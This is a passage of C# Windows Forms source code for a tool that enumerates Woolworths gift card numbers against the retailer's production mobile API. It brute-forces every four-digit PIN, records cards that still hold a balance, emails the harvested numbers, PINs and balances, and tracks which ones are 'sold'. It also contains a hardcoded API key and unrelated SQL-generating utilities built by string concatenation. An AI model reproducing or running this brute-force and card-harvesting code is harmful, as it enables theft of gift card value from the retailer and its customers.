                    continue;
                }
                string initStr = File.ReadAllText(initFilePath);
                if (initStr.Contains(initFieldStopAll + ":True"))
                {
                    initStr = initStr.Replace(initFieldStopAll + ":True", initFieldStopAll + ":False");
                    File.WriteAllText(initFilePath, initStr);
                    stop = true;
                    richTextBox1.Clear();
                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " User Stop All and clear all screen logs", Color.Blue);
                    break;
                }
                if (initStr.Contains(initFieldChangeTheKeys + ":True"))
                {
                    initStr = initStr.Replace(initFieldChangeTheKeys + ":True", initFieldChangeTheKeys + ":False");
                    File.WriteAllText(initFilePath, initStr);
                    string[] lines = initStr.Split('\n');
                    foreach (string line in lines)
                    {
                        if (line.Contains("Key:"))
                        {
                            textBoxKey.Text = line.Replace("Key:", "").Replace("\r", "");
                        }
                        if (line.Contains("Digest:"))
                        {
                            textBoxDigest.Text = line.Replace("Digest:", "").Replace("\r", "");
                        }
                        if (line.Contains("Udid:"))
                        {
                            textBoxUdid.Text = line.Replace("Udid:", "").Replace("\r", "");
                        }
                    }
                }
                gKey = textBoxKey.Text;
                gDigest = textBoxDigest.Text;
                gUdid = textBoxUdid.Text;
                try
                {
                    //string response = sendRequest(
                    //    "https://prod.mobile-api.woolworths.com.au/money/v1/cardInfo?size=hdpi&apikey=tld7DGjzQv3VG26FW1vLb1AswxbSKPbm&udid=ec56eec2ba9657a2 ",
                    //    "POST",
                    //    "",
                    //    false,
                    //    @"{""rewardsCardNo"":""9353221235531""}",
                    //    ref cookie,
                    //    gHost,
                    //    true
                    //);

                    string response = sendRequest(
                       "https://prod.mobile-api.woolworths.com.au/wow/v1/giftcards/history?udid=" + gUdid,
                       "POST",
                       "",
                       false,
                       @"{""cardNumber"":""" + i.ToString() + @""" ,""pincode"":""" + "3721" + @"""}",
                       ref cookie,
                       gHost,
                       true
                    );
                    InternalServerErrorCount = 0;
                    var json_serializer = new JavaScriptSerializer();
                    var routes_list = (IDictionary<string, object>)json_serializer.DeserializeObject(response);
                    if (routes_list.ContainsKey("code"))
                    {
                        int code = int.Parse(routes_list["code"].ToString());
                        if(code == 201)
                        {
                            setLogT(richTextBox1, DateTime.Now.ToString() + " Invalid number: " + i.ToString());
                            File.AppendAllLines(blackFilePath, new[] { i.ToString() });
                        }
                        else if (code == 204) // wrong password
                        {
                            int currentPassword = 0;
                            if(!AddCredentialCode(i.ToString())) //exist in list
                            {
                                currentPassword = GetLastTriedPassword(i.ToString());
                            }
                            while(currentPassword < 10000)
                            {
                                if (stop)
                                {
                                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Stopped by user", Color.Blue);
                                    break;
                                }
                                initStr = File.ReadAllText(initFilePath);
                                if (initStr.Contains(initFieldStopAll + ":True"))
                                {
                                    initStr = initStr.Replace(initFieldStopAll + ":True", initFieldStopAll + ":False");
                                    File.WriteAllText(initFilePath, initStr);
                                    stop = true;
                                    richTextBox1.Clear();
                                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " User Stop All and clear all screen logs", Color.Blue);
                                    break;
                                }
                                if (initStr.Contains(initFieldChangeTheKeys + ":True"))
                                {
                                    initStr = initStr.Replace(initFieldChangeTheKeys + ":True", initFieldChangeTheKeys + ":False");
                                    File.WriteAllText(initFilePath, initStr);
                                    string[] lines = initStr.Split('\n');
                                    foreach (string line in lines)
                                    {
                                        if (line.Contains("Key:"))
                                        {
                                            textBoxKey.Text = line.Replace("Key:", "").Replace("\r", "");
                                        }
                                        if (line.Contains("Digest:"))
                                        {
                                            textBoxDigest.Text = line.Replace("Digest:", "").Replace("\r", "");
                                        }
                                        if (line.Contains("Udid:"))
                                        {
                                            textBoxUdid.Text = line.Replace("Udid:", "").Replace("\r", "");
                                        }
                                    }
                                }
                                gKey = textBoxKey.Text;
                                gDigest = textBoxDigest.Text;
                                gUdid = textBoxUdid.Text;
                                try
                                {
                                    response = sendRequest(
                                       "https://prod.mobile-api.woolworths.com.au/wow/v1/giftcards/history?udid=" + gUdid,
                                       "POST",
                                       "",
                                       false,
                                       @"{""cardNumber"":""" + i.ToString() + @""" ,""pincode"":""" + currentPassword.ToString("D4") + @"""}",
                                       ref cookie,
                                       gHost,
                                       true
                                    );
                                }
                                catch (Exception e)
                                {
                                    if (e.Message.Contains("Internal Server Error") || e.Message.Contains("Unauthorized"))
                                    {
                                        InternalServerErrorCount++;
                                        if (InternalServerErrorCount >= 3)
                                        {
                                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Stop for expired key ", Color.Blue);
                                            stop = true;
                                        }
                                    }
                                    continue;
                                }
                                InternalServerErrorCount = 0;
                                var json_serializer2 = new JavaScriptSerializer();
                                var routes_list2 = (IDictionary<string, object>)json_serializer.DeserializeObject(response);
                                if (routes_list2.ContainsKey("code"))
                                {
                                    int code2 = int.Parse(routes_list2["code"].ToString());
                                    if (code2 == 201)
                                    {
                                        setLogT(richTextBox1, DateTime.Now.ToString() + " Invalid number: " + i.ToString());
                                        File.AppendAllLines(blackFilePath, new[] { i.ToString() });
                                        break;
                                    }
                                    else if (code2 == 204) // wrong password
                                    {
                                        setLogT(richTextBox1, DateTime.Now.ToString() + " " + i.ToString() + ", wrong password " + currentPassword.ToString("D4"));
                                        ChangePassword(i.ToString(), currentPassword.ToString("D4"));
                                        currentPassword++;
                                        continue;
                                    }
                                    else
                                    {
                                        setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Unkonwn Code: " + i.ToString() + ", password: " + currentPassword.ToString("D4"), Color.Red);
                                        File.AppendAllLines(blackFilePath, new[] { i.ToString() + ", password: " + currentPassword.ToString("D4") + ", " + routes_list["description"].ToString() });
                                    }
                                }
                                else if (routes_list2.ContainsKey("currentBalance"))
                                {
                                    decimal balance = decimal.Parse(routes_list2["currentBalance"].ToString());
                                    if (balance == 0)
                                    {
                                        setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Used number: " + i.ToString(), Color.Blue);
                                        File.AppendAllLines(blackFilePath, new[] { i.ToString() });
                                        break;
                                    }
                                    else if (balance > 0)
                                    {
                                        currentCount++;
                                        string result = i.ToString() + ", pin: " + currentPassword.ToString("D4") + ", balance: " + balance;
                                        File.AppendAllLines(whileFilePath, new[] { result });
                                        string final = i.ToString() + ", pin: " + currentPassword.ToString("D4") + ", balance: " + balance;
                                        File.AppendAllLines(finalFile, new[] { final });
                                        int total = 0;
                                        int tonight = 0;
                                        string[] lines = File.ReadAllLines(globalInitFile);
                                        for (int j = 0; j < lines.Length; j++)
                                        {
                                            if (lines[j].Contains(globalInitFieldTotalCount + ":"))
                                            {
                                                total = int.Parse(lines[j].Replace(globalInitFieldTotalCount + ":", "")) + 1;
                                                lines[j] = globalInitFieldTotalCount + ":" + total;
                                                continue;
                                            }
                                            if (lines[j].Contains(globalInitFieldTonightCount + ":"))
                                            {
                                                tonight = int.Parse(lines[j].Replace(globalInitFieldTonightCount + ":", "")) + 1;
                                                lines[j] = globalInitFieldTonightCount + ":" + tonight;
                                                continue;
                                            }
                                        }
                                        File.WriteAllLines(globalInitFile, lines);
                                        Invoke(new Action(() =>
                                        {
                                            label6.Text = "Find eGift: Total:" + total + "; Tonight:" + tonight + "; Current:" + currentCount;
                                        }));
                                        setLogtColorful(richTextBox1, result, Color.Green);
                                        break;
                                    }
                                }
                                else //no 'code', no 'currentBalance'
                                {
                                    setLogtColorful(richTextBox1, "Something Wrong: " + response, Color.Red);
                                    currentPassword--;//retry this password
                                }
                                currentPassword++;
                            }
                        }
                        else
                        {
                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Unkonwn Code: " + i.ToString(), Color.Red);
                            File.AppendAllLines(blackFilePath, new[] { i.ToString() + ", " + routes_list["description"].ToString() });
                        }
                    }
                    else if (routes_list.ContainsKey("currentBalance"))
                    {
                        decimal balance = decimal.Parse(routes_list["currentBalance"].ToString());
                        if(balance == 0)
                        {
                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Used number: " + i.ToString(), Color.Blue);
                            File.AppendAllLines(blackFilePath, new[] { i.ToString() });
                        }
                        else if(balance > 0)
                        {
                            currentCount++;
                            string result = i.ToString() + ", pin: " + "3721" + ", balance: " + balance;
                            File.AppendAllLines(whileFilePath, new[] { result });
                            //string final = @"http://barcode.tec-it.com/en/EAN13?data=" + i.ToString();
                            string final = i.ToString() + ", pin: " + "3721";
                            File.AppendAllLines(finalFile, new[] { final });
                            int total = 0;
                            int tonight = 0;
                            string[] lines = File.ReadAllLines(globalInitFile);
                            for (int j = 0; j < lines.Length; j++)
                            {
                                if (lines[j].Contains(globalInitFieldTotalCount + ":"))
                                {
                                    total = int.Parse(lines[j].Replace(globalInitFieldTotalCount + ":", "")) + 1;
                                    lines[j] = globalInitFieldTotalCount + ":" + total;
                                    continue;
                                }
                                if (lines[j].Contains(globalInitFieldTonightCount + ":"))
                                {
                                    tonight = int.Parse(lines[j].Replace(globalInitFieldTonightCount + ":", "")) + 1;
                                    lines[j] = globalInitFieldTonightCount + ":" + tonight;
                                    continue;
                                }
                            }
                            File.WriteAllLines(globalInitFile, lines);
                            Invoke(new Action(() =>
                            {
                                label6.Text = "Find eGift: Total:" + total + "; Tonight:" + tonight + "; Current:" + currentCount;
                            }));
                            //MyVoucher += result + Environment.NewLine; //will update this variable at beginning of start
                            setLogtColorful(richTextBox1, result, Color.Green);
                        }
                    }
                    else //no 'code', no 'currentBalance'
                    {
                        setLogtColorful(richTextBox1, "Something Wrong: " + response, Color.Red);
                    }
                }
                catch (Exception e)
                {
                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " when probing " + i.ToString() + ": " + e.Message, Color.Red);
                    if (e.Message.Contains("Internal Server Error") || e.Message.Contains("Unauthorized"))
                    {
                        InternalServerErrorCount++;
                        if (InternalServerErrorCount >= 3)
                        {
                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Stop for expired key ", Color.Blue);
                            stop = true;
                        }
                    }
                }
            }
            if (i > numericUpDown2.Value)
            {
                setLogtColorful(richTextBox1, DateTime.Now.ToString() + " All numbers in this Range have been detected! ", Color.Green);
            }
            isRuning = false;
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            stop = true;
            writeInit();
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            richTextBox1.SelectionStart = richTextBox1.Text.Length;
            // scroll it automatically
            richTextBox1.ScrollToCaret();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            try
            {
                string fahterFolder = Directory.GetParent(
                    Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory).ToString())
                    .ToString();
                string resultRelativeFileName = Path.GetFileName(finalFile);
                string valueRelativeFileName = Path.GetFileName(valueFile);
                string extractResultFile = Path.Combine(fahterFolder, "result20_" + DateTime.Now.ToString("yyyyMMddHHmmss") + ".txt");
                string extractValueFile = Path.Combine(fahterFolder, "value" + DateTime.Now.ToString("yyyyMMddHHmmss") + ".txt");
                string soldListPath = Path.Combine(fahterFolder, soldList);
                string[] folders = textBoxFolders.Text.Split(',');
                bool haveNewResult = false;
                foreach (string folder in folders)
                {
                    string resultFile = Path.Combine(fahterFolder, folder, resultRelativeFileName);
                    if (File.Exists(resultFile))
                    {
                        string temp = File.ReadAllText(resultFile);
                        if (!string.IsNullOrEmpty(temp))
                        { 
                            File.AppendAllText(extractResultFile, temp);
                            File.WriteAllText(resultFile, "");
                            haveNewResult = true;
                        }
                    }
                    string valueFile = Path.Combine(fahterFolder, folder, valueRelativeFileName);
                    if (File.Exists(valueFile))
                    {
                        string temp = File.ReadAllText(valueFile);
                        if (!string.IsNullOrEmpty(temp))
                        {
                            File.AppendAllText(extractValueFile, temp);
                            File.WriteAllText(valueFile, "");
                        }
                    }
                }

                if (haveNewResult && !string.IsNullOrEmpty(File.ReadAllText(extractResultFile)))
                {
                    if (!File.Exists(soldListPath))
                    {
                        File.AppendAllText(soldListPath, "");
                    }
                    string soldStr = File.ReadAllText(soldListPath);
                    string[] resultCheck = File.ReadAllLines(extractResultFile);
                    for (int i = 0; i < resultCheck.Length; i++)
                    {
                        if (soldStr.Contains(resultCheck[i]))
                        {
                            resultCheck[i] = "";
                        }
                    }

                    File.WriteAllLines(extractResultFile, resultCheck.Distinct().ToArray());
                    File.AppendAllText(soldListPath, File.ReadAllText(extractResultFile));

                    SmtpClient smtpSrv = new SmtpClient();
                    smtpSrv.Host = server_address;
                    smtpSrv.Port = Convert.ToInt32(server_port);
                    smtpSrv.DeliveryMethod = SmtpDeliveryMethod.Network;
                    smtpSrv.EnableSsl = EnableSsl;
                    smtpSrv.UseDefaultCredentials = false;
                    smtpSrv.Credentials = new NetworkCredential(MailUserName, password);

                    try
                    {

                        MailMessage mailMessage = new MailMessage();
                        mailMessage.From = new MailAddress(FromEmail);
                        mailMessage.To.Add(ToEmail);
                        mailMessage.Subject = DateTime.Now.ToString("yyyyMMddHHmmss");
                        mailMessage.Body = DateTime.Now.ToString("yyyyMMddHHmmss");

                        Attachment attachment = new Attachment(extractResultFile);
                        mailMessage.Attachments.Add(attachment);
                        smtpSrv.Send(mailMessage);
                        attachment.Dispose();
                        setLogtColorful(richTextBox1, DateTime.Now.ToString() + "Succeful to Send Result " + Path.GetFileName( extractResultFile ), Color.Green);
                    }
                    catch (Exception ex)
                    {
                        throw ex;
                    }
                }
                else
                {
                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " No new result found", Color.Blue);
                }
            }
            catch(Exception ex)
            {
                setLogtColorful(richTextBox1, DateTime.Now.ToString() + " when Extracting: " + ex.Message, Color.Red);
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                string filePath = openFileDialog1.FileName;
                List<string> lines = File.ReadAllLines(filePath).ToList();
                var dupes =
                    lines.GroupBy(l => l)
                     .Select(g => new { Value = g.Key, Count = g.Count() })
                     .Where(g => g.Count > 1);
                bool dupe = false;
                foreach (var d in dupes)
                {
                    dupe = true;
                    setLogtColorful(richTextBox1, d.Value + " is a dupe", Color.Red);
                }
                if (!dupe)
                {
                    setLogtColorful(richTextBox1, "No dupe lines!", Color.Green);
                }
                else
                {
                    setLogtColorful(richTextBox1, "Total dupe: " + dupes.Count(), Color.Red);
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                string filePath = openFileDialog1.FileName;
                string[] lines = File.ReadAllLines(filePath);
                File.WriteAllLines(filePath, lines.Distinct().ToArray());
                setLogtColorful(richTextBox1, "Distinction Succeed!", Color.Blue);
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            writeInit();

            stop = false;
            new Thread(() =>
            {
                runInList();
            }).Start();
        }

        public void runInList()
        {
            string filePath = "";
            DialogResult dresult = DialogResult.None;
            Invoke(new Action(() =>
            {
                dresult = openFileDialog1.ShowDialog();
                filePath = openFileDialog1.FileName;
            }));
            if (dresult == DialogResult.OK)
            {
                List<string> lines = File.ReadAllLines(filePath).ToList();
                var dupes =
                    lines.GroupBy(l => l)
                     .Select(g => new { Value = g.Key, Count = g.Count() })
                     .Where(g => g.Count > 1);
                bool dupe = false;
                foreach (var d in dupes)
                {
                    dupe = true;
                    Invoke(new Action(() =>
                    {
                        setLogtColorful(richTextBox1, d.Value + " is a dupe", Color.Red);
                    }));
                }
                if (!dupe)
                {
                    Invoke(new Action(() =>
                    {
                        setLogtColorful(richTextBox1, "No dupe lines!", Color.Green);
                    }));
                }
                else
                {
                    Invoke(new Action(() =>
                    {
                        setLogtColorful(richTextBox1, "Total dupe: " + dupes.Count(), Color.Red);
                    }));
                }

                lines = lines.Distinct().ToArray().ToList();

                string fahterFolder = Directory.GetParent(
                        Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory).ToString())
                        .ToString();
                string soldListPath = Path.Combine(fahterFolder, soldList);
                if (!File.Exists(soldListPath))
                {
                    File.AppendAllText(soldListPath, "");
                }
                string soldStr = File.ReadAllText(soldListPath);
                CookieCollection cookie = new CookieCollection();
                int validCount = 0;
                foreach (string line0 in lines)
                {
                    string line = line0;
                    if (stop)
                    {
                        break;
                    }
                    if (line0.Contains("data"))
                    {
                        line = line0.Replace("http://barcode.tec-it.com/en/EAN13?data=", "");
                    }
                    bool sold = false;
                    if (soldStr.Contains(line))
                    {
                        sold = true;
                    }
                    gKey = textBoxKey.Text;
                    gDigest = textBoxDigest.Text;
                    gUdid = textBoxUdid.Text;
                    try
                    {
                        string response = sendRequest(
                           "https://prod.mobile-api.woolworths.com.au/money/v2/rewards/balance?udid=" + gUdid,
                           "POST",
                           "",
                           false,
                           @"{""rewardsCardNo"":""" + line + @"""}",
                           ref cookie,
                           gHost,
                           true
                        );

                        var json_serializer = new JavaScriptSerializer();
                        var routes_list = (IDictionary<string, object>)json_serializer.DeserializeObject(response);
                        if (routes_list.ContainsKey("data")
                            && ((IDictionary<string, object>)routes_list["data"]).ContainsKey("rewardbalance")
                            )
                        {
                            var data = (IDictionary<string, object>)(((IDictionary<string, object>)routes_list["data"])["rewardbalance"]);
                            decimal Voucher = decimal.Parse(data["currentVoucherBalance"].ToString());
                            decimal Point = decimal.Parse(data["currentPointBalance"].ToString());
                            decimal WowPoint = decimal.Parse(data["currentWowPointBalance"].ToString());
                            string result = (sold ? "Sold" : "Not Sold") + ": " + line
                                + ", Voucher: " + Voucher + ", Point: " + Point + ", WowPoint: " + WowPoint;
                            Color c = Color.White;
                            if (Voucher == 20)
                            {
                                validCount++;
                                c = Color.Green;
                            }
                            else if (Voucher > 20)
                            {
                                c = Color.Orange;
                            }
                            else if (Voucher < 20)
                            {
                                c = Color.Red;
                            }
                            Invoke(new Action(() =>
                            {
                                setLogtColorful(richTextBox1, result, c);
                            }));
                        }
                        else
                        {
                            Invoke(new Action(() =>
                            {
                                setLogT(richTextBox1, DateTime.Now.ToString() + " Invalid number: " + line);

                            }));
                        }

                    }
                    catch (Exception e)
                    {
                        Invoke(new Action(() =>
                        {
                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " when probing " + line + ": " + e.Message, Color.Red);
                        }));
                    }
                }
                Invoke(new Action(() =>
                {
                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Run in List Finished! Valid numbers in List: " + validCount, Color.Blue);
                }));
            }
        }

        private void StartAllButton_Click(object sender, EventArgs e)
        {
            try
            {
                string fahterFolder = Directory.GetParent(
                    Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory).ToString())
                    .ToString();
                string[] folders = textBoxFolders.Text.Split(',');
                foreach (string folder in folders)
                {
                    string initFilePath0 = Path.Combine(fahterFolder, folder, Path.GetFileName(initFilePath));
                    if (File.Exists(initFilePath0))
                    {
                        string temp = File.ReadAllText(initFilePath0);
                        if (temp.Contains(initFieldStartAll + ":False"))
                        {
                            temp = temp.Replace(initFieldStartAll + ":False", initFieldStartAll + ":True");
                            File.WriteAllText(initFilePath0, temp);
                        }
                        else if (!temp.Contains(initFieldStartAll + ":"))
                        {
                            temp += Environment.NewLine + initFieldStartAll + ":True";
                            File.WriteAllText(initFilePath0, temp);
                        }
                        else if (temp.Contains(initFieldStartAll + ":True"))
                        {
                            //do nothing
                        }
                        else
                        {
                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " The line 'StartAll' error in .init", Color.Red);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                setLogtColorful(richTextBox1, DateTime.Now.ToString() + " when Starting All: " + ex.Message, Color.Red);
            }
        }

        private void StopAllButton_Click(object sender, EventArgs e)
        {
            try
            {
                string fahterFolder = Directory.GetParent(
                    Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory).ToString())
                    .ToString();
                string[] folders = textBoxFolders.Text.Split(',');
                foreach (string folder in folders)
                {
                    string initFilePath0 = Path.Combine(fahterFolder, folder, Path.GetFileName(initFilePath));
                    if (File.Exists(initFilePath0))
                    {
                        string temp = File.ReadAllText(initFilePath0);
                        if (temp.Contains(initFieldStopAll + ":False"))
                        {
                            temp = temp.Replace(initFieldStopAll + ":False", initFieldStopAll + ":True");
                            File.WriteAllText(initFilePath0, temp);
                        }
                        else if (!temp.Contains(initFieldStopAll + ":"))
                        {
                            temp += Environment.NewLine + initFieldStopAll + ":True";
                            File.WriteAllText(initFilePath0, temp);
                        }
                        else if (temp.Contains(initFieldStopAll + ":True"))
                        {
                            //do nothing
                        }
                        else
                        {
                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + "The line 'StartAll' error in .init", Color.Red);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                setLogtColorful(richTextBox1, DateTime.Now.ToString() + " when Stoping All: " + ex.Message, Color.Red);
            }
        }

        private void SetToAllButton_Click(object sender, EventArgs e)
        {
            try
            {
                string fahterFolder = Directory.GetParent(
                    Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory).ToString())
                    .ToString();
                string[] folders = textBoxFolders.Text.Split(',');
                foreach (string folder in folders)
                {
                    string initFilePath0 = Path.Combine(fahterFolder, folder, Path.GetFileName(initFilePath));
                    if (File.Exists(initFilePath0))
                    {
                        string[] lines = File.ReadAllLines(initFilePath0);
                        bool haveChangeKeyField = false;
                        for(int i = 0; i < lines.Length; i++)
                        {
                            if (lines[i].Contains("Key:"))
                            {
                                lines[i] = "Key:" + textBoxKey.Text;
                                continue;
                            }
                            if (lines[i].Contains("Digest:"))
                            {
                                lines[i] = "Digest:" + textBoxDigest.Text;
                                continue;
                            }
                            if (lines[i].Contains("Udid:"))
                            {
                                lines[i] = "Udid:" + textBoxUdid.Text;
                                continue;
                            }
                            if (lines[i].Contains(initFieldChangeTheKeys + ":"))
                            {
                                lines[i] = initFieldChangeTheKeys + ":True";
                                haveChangeKeyField = true;
                                continue;
                            }
                            
                        }
                        File.WriteAllLines(initFilePath0, lines);
                        if (!haveChangeKeyField)
                        {
                            File.WriteAllText(initFilePath0,
                                File.ReadAllText(initFilePath0) + Environment.NewLine + initFieldChangeTheKeys + ":True");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                setLogtColorful(richTextBox1, DateTime.Now.ToString() + " when setting keys to all: " + ex.Message, Color.Red);
            }

            //test
            DateTime dt = DateTime.Now;
            decimal dc = 23.45M;
            setLogtColorful(richTextBox1, String.Format("{0:t} {0:dd/mm/yy} {1:N2}",dt, dc), Color.Green);
        }

        public class RangeObject
        {
            public string folder;
            public decimal from;
            public decimal to;
        }
        private void CheckDupeRangeButton_Click(object sender, EventArgs e)
        {
            try
            {
                writeInit();
                string fahterFolder = Directory.GetParent(
                    Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory).ToString())
                    .ToString();
                string[] folders = textBoxFolders.Text.Split(',');
                List<RangeObject> rangeList = new List<RangeObject>();
                foreach (string folder in folders)
                {
                    string initFilePath0 = Path.Combine(fahterFolder, folder, Path.GetFileName(initFilePath));
                    if (File.Exists(initFilePath0))
                    {
                        string[] lines = File.ReadAllLines(initFilePath0);
                        decimal from = 0;
                        decimal to = 0;
                        for (int i = 0; i < lines.Length; i++)
                        {
                            if (lines[i].Contains("From:"))
                            {
                                from = decimal.Parse(lines[i].Replace("From:", ""));
                                continue;
                            }
                            if (lines[i].Contains("To:"))
                            {
                                to = decimal.Parse(lines[i].Replace("To:", ""));
                                continue;
                            }
                        }
                        if(from!=0 && to != 0)
                        {
                            RangeObject r = new RangeObject();
                            r.folder = folder;
                            r.from = from;
                            r.to = to;
                            rangeList.Add(r);
                        }
                        else
                        {
                            setLogtColorful(richTextBox1, folder + " Range Error!", Color.Red);
                        }
                    }
                }
                int foldersCount = rangeList.Count;
                while(rangeList.Count > 0)
                {
                    for(int k = 1; k < rangeList.Count; k++)
                    {
                        if(
                               (rangeList[0].from >= rangeList[k].from && rangeList[0].from <= rangeList[k].to)
                            || (rangeList[0].to >= rangeList[k].from && rangeList[0].to <= rangeList[k].to)
                          )
                        {
                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Dupe Range: " +
                                rangeList[0].folder + " and " + rangeList[k].folder
                                , Color.Red);
                        }
                    }
                    rangeList.RemoveAt(0);
                }
                setLogtColorful(richTextBox1, DateTime.Now.ToString() +": " + foldersCount + " folders checked!" , Color.Blue);
            }
            catch (Exception ex)
            {
                setLogtColorful(richTextBox1, DateTime.Now.ToString() + " when checking dupe range: " + ex.Message, Color.Red);
            }
        }

        private void buttonSetToning0_Click(object sender, EventArgs e)
        {
            string[] lines = File.ReadAllLines(globalInitFile);
            for (int j = 0; j < lines.Length; j++)
            {
                if (lines[j].Contains(globalInitFieldTonightCount + ":"))
                {
                    lines[j] = globalInitFieldTonightCount + ":0";
                    break;
                }
            }
            File.WriteAllLines(globalInitFile, lines);
        }

        private void buttonUtil_Click_1(object sender, EventArgs e)
        {
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                string filePath = openFileDialog1.FileName;
                string folder = Path.GetDirectoryName(filePath);
                string sqlFile = folder + "\\" + "updateBCDate.sql";
                string icsFile = folder + "\\" + "CalendarReminder.ics";
                string namesFile = folder + "\\" + "names.txt";
                File.WriteAllText(sqlFile, "");
                File.WriteAllText(icsFile, "BEGIN:VCALENDAR" + Environment.NewLine 
                    + "PRODID:-//Flo Inc.//FloSoft//EN" + Environment.NewLine);
                List<string> names = File.ReadAllLines(namesFile).Distinct().ToList();
                Dictionary<string, string> codeNamePairs = new Dictionary<string, string>();
                foreach (string line in names)
                {
                    string[] cells = line.Split(';');
                    if (cells.Length == 2)
                    {
                        codeNamePairs.Add(cells[0], cells[1]);
                    }
                }

                List<string> lines = File.ReadAllLines(filePath).Distinct().ToList();
                foreach (string line in lines)
                {
                    string[] cells = line.Split(',');
                    if(cells.Length == 3)
                    {
                        string updatesql = "update bodycorps set bodycorp_close_period_date = '"+DateTime.Parse(cells[2]).ToString("yyyy-MM-dd")
                            +"', bodycorp_begin_date = '"+ DateTime.Parse(cells[1]).ToString("yyyy-MM-dd")
                            + "' where bodycorp_code = '"+cells[0]+"';";
                        File.AppendAllLines(sqlFile, new[] { updatesql });

                        string ics = "BEGIN:VEVENT" + Environment.NewLine
                            + "DTSTART:" + DateTime.Parse(cells[2]).AddMonths(-1).ToString("yyyyMMdd") + "T080000" + Environment.NewLine
                            + "DTEND:" + DateTime.Parse(cells[2]).AddMonths(-1).ToString("yyyyMMdd") + "T090000" + Environment.NewLine
                            + "LOCATION:" + Environment.NewLine
                            + "SUMMARY:" + "Notification of Insurance End Date Updated: The Insurance End Date is " + DateTime.Parse(cells[2]).ToString("dd/MM/yyyy")
                            + " | BC "+ cells[0] + " | " + codeNamePairs[cells[0]] + Environment.NewLine
                            + "PRIORITY:3" + Environment.NewLine
                            + "END:VEVENT" + Environment.NewLine;
                        File.AppendAllLines(icsFile, new[] { ics });
                    }
                    else
                    {
                        setLogtColorful(richTextBox1,  " unhandle line: " + line , Color.Red);
                    }
                }
                File.AppendAllLines(icsFile, new[] { "END:VCALENDAR" });
            }
        }

        private void buttonUpdateInsuranceUpdate_Click_1(object sender, EventArgs e)
        {
            DialogResult result = openFileDialog1.ShowDialog();
            if (result == DialogResult.OK)
            {
                string filePath = openFileDialog1.FileName;
                string folder = Path.GetDirectoryName(filePath);
                string sqlFile = folder + "\\" + "UpdateInsurance.sql";
                string icsFile = folder + "\\" + "CalendarReminder.ics";
                string namesFile = folder + "\\" + "5bc_bodycopr_code_name_pair.csv";
                File.WriteAllText(sqlFile, "");
                File.WriteAllText(icsFile, "BEGIN:VCALENDAR" + Environment.NewLine
                    + "PRODID:-//Flo Inc.//FloSoft//EN" + Environment.NewLine);
                DataTable csvDT = CsvToDataTable(namesFile);
                Dictionary<string, string> codeNamePairs = new Dictionary<string, string>();
                foreach (DataRow line in csvDT.Rows)
                {
                    codeNamePairs.Add(line["bodycorp_code"].ToString(), line["bodycorp_name"].ToString());
                }

                List<string> lines = File.ReadAllLines(filePath).Distinct().ToList();
                int count = 0;
                foreach (string line in lines)
                {
                    string[] cells = line.Split(',');
                    if (cells.Length == 7)
                    {
                        if (!codeNamePairs.ContainsKey(cells[0]))
                        {
                            setLogtColorful(richTextBox1, " unknown bc code: " + line, Color.Red);
                            continue;
                        }
                        
                        string updatesql = "insert into pptyins_master set pptyins_master_type_id = (select pptyins_type_id from pptyins_types where LOWER(`pptyins_type_code`) = LOWER('" + cells[1] + "') ),"
                                            + " pptyins_master_property_id = (select property_master_id from property_master where property_master_bodycorp_id = (select bodycorp_id from bodycorps where bodycorp_code = '"+ cells[0] + "')), "
                                            + " pptyins_master_policy_num = '"+ cells[2] + "',"
                                            + " pptyins_master_broker_id = (select contact_master_id from contact_master where LOWER(`contact_master_name`) = LOWER('" + cells[3] + "') and contact_master_type_id = (select contact_type_id from contact_types where contact_type_code = 'BROKER') limit 1),"
                                            + " pptyins_master_underwriter_id = (select contact_master_id from contact_master where LOWER(`contact_master_name`) = LOWER('" + cells[4] + "') and contact_master_type_id = (select contact_type_id from contact_types where contact_type_code = 'UNDERWRITER') limit 1),"
                                            + " pptyins_master_start = '"+ DateTime.ParseExact(cells[5], "dd/MM/yyyy",System.Globalization.CultureInfo.InvariantCulture).ToString("yyyy-MM-dd") + "',"
                                            + " pptyins_master_end = '"+ DateTime.ParseExact(cells[6], "dd/MM/yyyy", System.Globalization.CultureInfo.InvariantCulture).ToString("yyyy-MM-dd") + "' ;"; 
                        File.AppendAllLines(sqlFile, new[] { updatesql });

                        string ics = "BEGIN:VEVENT" + Environment.NewLine
                            + "DTSTART:" + DateTime.ParseExact(cells[6], "dd/MM/yyyy", System.Globalization.CultureInfo.InvariantCulture).AddMonths(-2).ToString("yyyyMMdd") + "T080000" + Environment.NewLine
